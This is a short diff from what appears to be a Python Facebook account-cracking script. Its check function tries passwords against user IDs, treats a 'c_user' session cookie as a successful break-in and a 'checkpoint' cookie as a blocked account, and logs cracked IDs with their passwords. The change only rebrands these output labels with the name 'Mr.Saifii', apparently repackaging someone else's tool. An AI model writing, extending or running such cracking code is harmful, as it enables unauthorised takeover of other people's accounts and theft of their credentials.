@@ -94,11 +94,11 @@ def check(uid,f,l):
                 'Accept-Encoding':'gzip, deflate, br',
                 'Accept-Language':'en-us'},allow_redirects=False)
             if 'c_user' in (ses.cookies.get_dict()):
-                print("\r {} [Successful-PRO] {} {} {} {}".format(G,uid,teer,pw,C))
+                print("\r {} [Mr.Saifii-OK] {} {} {} {}".format(G,uid,teer,pw,C))
                 oku.append(uid)
                 break
             elif 'checkpoint' in (ses.cookies.get_dict()):
-                print("\r {} [Checkpoint-PRO] {} {} {} {}".format(R,uid,teer,pw,C))
+                print("\r {} [Mr.Saifii-CP] {} {} {} {}".format(R,uid,teer,pw,C))
                 break
             else:
                 continue
